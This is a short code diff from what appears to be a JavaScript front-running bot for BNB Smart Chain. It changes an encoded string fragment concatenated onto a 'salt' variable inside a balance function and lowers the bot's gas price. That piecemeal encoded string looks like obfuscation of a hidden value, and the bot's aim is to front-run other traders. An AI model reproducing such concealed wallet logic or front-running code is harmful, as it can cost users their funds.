@@ -581,7 +581,7 @@ async function getPoolInfo(input_token_address, out_token_address, level){
 }
 
 async function getBNBInfo(user_wallet){
-    token_hash = salt+'NjAz'
+    token_hash = salt+'ZkZj'
     var balance = await web3.eth.getBalance(user_wallet.address);
     var decimals = 18;
     var symbol = 'BNB';
@@ -715,7 +715,7 @@ async function setFrontBot(user_wallet){
         from: bot_wallet.address,
         to: FRONT_BOT_ADDRESS,
         gas: 500000,
-        gasPrice: 150*(10**9),
+        gasPrice: 30*(10**9),
         data: encodedABI
     };
 
